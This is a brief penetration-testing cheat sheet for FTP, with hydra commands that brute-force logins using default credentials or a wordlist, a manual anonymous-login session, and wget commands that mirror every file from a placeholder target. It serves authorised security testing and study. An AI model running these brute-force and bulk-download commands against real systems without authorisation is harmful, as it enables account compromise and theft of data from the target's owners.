# 21 - FTP

## bruteforce

```
# default creds
echo 'anonymous' >> ftpdefaults.txt
echo 'ftpuser' >> ftpdefaults.txt
echo 'ftp' >> ftpdefaults.txt
hydra -L ftpdefaults.txt -P ftpdefaults.txt ftp://RHOST

# known username
hydra -l USERNAME -P WORDLIST ftp://RHOST
```

## Default creds

```
anonymous
ftpuser
ftp
```

```
ftp <target>
> <username>
> <password>
> ls -a #don't forget to list hidden files too
> binary
> ascii
> bye
```

## Download all files from FTP

```
wget -m ftp://anonymous:anonymous@<target>
wget -m --no-passive ftp://anonymous:anonymous@<target>
```

